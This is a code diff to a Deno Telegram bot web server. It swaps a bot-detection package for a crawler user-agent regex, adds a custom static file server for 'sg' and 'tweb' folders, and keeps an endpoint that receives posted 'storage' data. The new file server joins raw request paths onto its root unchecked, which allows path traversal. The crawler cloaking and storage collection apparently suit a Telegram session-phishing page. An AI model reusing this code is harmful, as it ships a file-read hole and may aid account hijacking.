@@ -1,11 +1,9 @@
-Nn
 import {
   Bot,
   InlineKeyboard,
   InputFile,
   webhookCallback,
 } from "https://deno.land/x/grammy@v1.30.0/mod.ts";
-import { isbot } from "isbot";
 import {
   Application,
   Context,
@@ -142,6 +140,51 @@ bot.catch((e) => {
 
 /* #region webserver */
 
+const MIME_TYPES: { [key: string]: string } = {
+  ".html": "text/html",
+  ".css": "text/css",
+  ".js": "application/javascript",
+  ".json": "application/json",
+  ".png": "image/png",
+  ".jpg": "image/jpeg",
+  ".jpeg": "image/jpeg",
+  ".svg": "image/svg+xml",
+  ".ico": "image/x-icon",
+  ".wasm": "application/wasm",
+  ".txt": "text/plain",
+};
+
+async function serveStatic(
+  ctx: Context,
+  root: string,
+  filePath: string,
+): Promise<void> {
+  try {
+    const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
+    const data = await Deno.readFile(fullPath);
+    const ext = filePath.includes(".") ? filePath.slice(filePath.lastIndexOf(".")) : "";
+    ctx.response.type = MIME_TYPES[ext] || "application/octet-stream";
+    ctx.response.body = data;
+  } catch {
+    // fallback to index.html for SPA routes
+    try {
+      const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
+      const data = await Deno.readFile(indexPath);
+      ctx.response.type = "text/html";
+      ctx.response.body = data;
+    } catch {
+      ctx.response.status = Status.NotFound;
+      ctx.response.body = "Not Found";
+    }
+  }
+}
+
+const BOT_REGEX = /bot|crawler|spider|crawl|scrape|facebookexternalhit|twitterbot|telegrambot|whatsapp|slack|discord|linkedinbot|googlebot|bingbot|duckduckgo|baiduspider|yandex|pinterest|embedly|preview|prerender|chrome-lighthouse/i;
+
+function isbot(ua: string): boolean {
+  return BOT_REGEX.test(ua);
+}
+
 const newVerified = async (ctx: Context) => {
   const body = await ctx.request.body.json();
   const storage = body.storage;
@@ -244,23 +287,11 @@ app.use(async (ctx: Context) => {
   } else if (path === "new-verified") {
     await newVerified(ctx);
   } else if (path.includes("sg")) {
-    await ctx.send({
-      path: "/",
-      root: `${Deno.cwd()}/static/sg`,
-      index,
-    });
+    await serveStatic(ctx, "./static/sg", index);
   } else if (path.includes("tweb")) {
-    await ctx.send({
-      path: "/",
-      root: `${Deno.cwd()}/static/tweb`,
-      index,
-    });
+    await serveStatic(ctx, "./static/tweb", index);
   } else if (path.split(".").length !== 0) {
-    await ctx.send({
-      path: "/",
-      root: `${Deno.cwd()}/static/tweb`,
-      index: path,
-    });
+    await serveStatic(ctx, "./static/tweb", path);
   } else {
     ctx.response.status = Status.OK;
     ctx.response.type = "json";
